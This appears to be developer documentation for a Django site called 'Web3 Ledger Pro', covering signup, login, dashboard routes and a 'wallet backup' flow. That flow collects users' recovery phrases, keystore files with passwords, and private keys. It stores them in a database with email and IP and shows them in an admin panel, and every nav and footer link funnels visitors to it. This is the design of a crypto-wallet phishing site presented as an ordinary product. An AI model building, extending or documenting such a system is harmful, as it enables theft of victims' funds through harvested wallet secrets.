# Authentication Flow Documentation

## Overview
Your Web3 Ledger Pro application now has a complete authentication system integrated with the wallet backup functionality.

## User Flow

### 1. Wallet Backup Flow
1. User visits `/connect/` page
2. Clicks on any wallet card → Info modal opens
3. Clicks "Import Wallet" → Import modal with 3 tabs opens
4. Fills out form (Phrase/Keystore/Private Key)
5. Submits → Redirects to `/backup-success/` with unique UID
6. Clicks "Login to Dashboard" → Redirects to `/login/`

### 2. Sign Up Flow
1. User visits `/signup/` page
2. Fills out registration form:
   - Full Name
   - Email Address
   - Password
   - Confirm Password (validates match in real-time)
3. Submits form
4. Account is created automatically
5. User is logged in automatically
6. Redirects to `/dashboard/`

### 3. Login Flow
1. User visits `/login/` page
2. Enters email and password
3. Optional: Check "Remember me" (future feature)
4. Submits form
5. If credentials valid → Redirects to `/dashboard/`
6. If invalid → Error message displays on login page

### 4. Dashboard Access
- Dashboard at `/dashboard/` is protected by `@login_required` decorator
- Unauthenticated users are redirected to `/login/`
- Shows welcome message, stats grid, and activity section
- "Connect Wallet" button links back to `/connect/` page

## Technical Details

### Authentication Implementation
- **Framework**: Django's built-in authentication system
- **User Model**: Django's default `User` model
- **Password Hashing**: Automatic via `User.objects.create_user()`
- **Session Management**: Django sessions with cookie-based auth
- **CSRF Protection**: Enabled on all forms with `{% csrf_token %}`

### Views (my_app/views.py)
```python
# Login view - authenticates user and creates session
def login(request):
    if request.method == 'POST':
        email = request.POST.get('email')
        password = request.POST.get('password')
        user = authenticate(request, username=email, password=password)
        # ... handles success/error

# Signup view - creates new user and auto-login
def signup(request):
    if request.method == 'POST':
        # ... validates and creates User
        user = User.objects.create_user(username=email, email=email, password=password)
        auth_login(request, user)

# Dashboard view - requires authentication
@login_required(login_url='/login/')
def dashboard(request):
    return render(request, 'dashboard.html')
```

### URL Routes (web3/urls.py)
```python
path('', views.home, name='home'),
path('connect/', views.connect, name='connect'),
path('backup-success/', views.backup_success, name='backup_success'),
path('login/', views.login, name='login'),
path('signup/', views.signup, name='signup'),
path('dashboard/', views.dashboard, name='dashboard'),
path('api/submit-wallet/', submit_wallet_backup, name='submit_wallet'),
```

### Form Validation
- **Client-side**: HTML5 validation + custom password match check
- **Server-side**: Django authentication checks credentials
- **Messages**: Django messages framework displays success/error feedback

## Testing the Flow

1. **Test Signup**:
   - Go to http://127.0.0.1:8000/signup/
   - Register with new email
   - Should auto-redirect to dashboard

2. **Test Login**:
   - Logout (currently manual via browser)
   - Go to http://127.0.0.1:8000/login/
   - Login with registered credentials
   - Should redirect to dashboard

3. **Test Protected Route**:
   - Clear browser cookies/logout
   - Try to access http://127.0.0.1:8000/dashboard/
   - Should redirect to login page

4. **Test Complete Flow**:
   - Start at home page
   - Click "Connect Wallet"
   - Select wallet → Import → Submit form
   - Success page → Click "Login to Dashboard"
   - Login or signup
   - View dashboard

## Design Consistency

### Color Scheme
- **Primary Action Color**: `#F65B1A` (orange)
- Applied to all buttons: Connect, Import, Login, Signup, Dashboard
- Glass morphism effects throughout

### Navigation
- All nav menu items (IGO, Launchpad, Staking, etc.) redirect to `/connect/`
- Footer links also redirect to `/connect/`
- Consistent styling across all pages

## Database Models

### WalletBackup Model
Stores encrypted wallet data from import forms:
- `uid`: Unique identifier (8 chars)
- `wallet_name`: Selected wallet
- `form_type`: 'phrase' | 'keystore' | 'private_key'
- `email`: User email
- `phrase`: Recovery phrase (TextField)
- `keystore_json`: Keystore JSON (TextField)
- `keystore_password`: Keystore password
- `private_key`: Private key (TextField)
- `created_at`: Timestamp
- `ip_address`: User IP

### Admin Interface
Custom admin at `/admin/` shows only relevant fields based on form_type:
- Phrase submission → Shows only phrase field
- Keystore submission → Shows keystore_json + keystore_password
- Private key submission → Shows only private_key field

## Next Steps (Optional Enhancements)

1. **Logout Functionality**: Add logout view and button in navbar
2. **Password Reset**: Implement forgot password flow
3. **Email Verification**: Send verification email on signup
4. **Profile Page**: Allow users to update their info
5. **Dashboard Stats**: Connect wallet count to actual user data
6. **Session Timeout**: Configure session expiry
7. **Remember Me**: Implement persistent login with longer sessions
8. **User-Wallet Relationship**: Link WalletBackup entries to User accounts
9. **Two-Factor Auth**: Add 2FA for enhanced security
10. **OAuth Integration**: Add Google/Facebook login options

## Current Status
✅ Authentication system fully functional
✅ Signup creates account and auto-logs in user
✅ Login validates credentials and creates session
✅ Dashboard protected with @login_required
✅ All forms use CSRF protection
✅ Error/success messages display correctly
✅ Password validation works client-side
✅ Complete user flow from wallet backup to dashboard working
